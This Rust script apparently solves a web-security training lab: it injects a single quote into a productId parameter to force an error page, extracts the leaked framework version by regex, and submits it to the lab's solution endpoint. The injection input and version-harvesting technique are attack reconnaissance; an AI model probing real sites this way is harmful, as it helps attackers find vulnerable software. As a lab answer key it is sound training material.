/*****************************************************************************
*
* Lab: Information disclosure in error messages
*
* Hack Steps: 
*      1. Inject a single quote in the productId parameter to cause an error
*      2. Extract the framework name
*      3. Submit the solution
*
******************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0aac009c04b02650818807e0006b00ce.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Injecting a single quote in the productId parameter to cause an error.. ");
    flush_terminal();

    let product = fetch("/product?productId=4'");

    println!("{}", "OK".green());
    print!("⦗2⦘ Extracting the framework name.. ");

    let body = product.text().unwrap();
    let framework = capture_pattern_from_text("(Apache Struts 2 2.3.31)", &body);

    println!("{} => {}", "OK".green(), framework.yellow());
    print!("⦗3⦘ Submitting the solution..");

    submit_solution(&framework);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

fn submit_solution(answer: &str) {
    WEB_CLIENT
        .post(format!("{LAB_URL}/submitSolution"))
        .form(&HashMap::from([("answer", answer)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to submit the solution".red()));
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
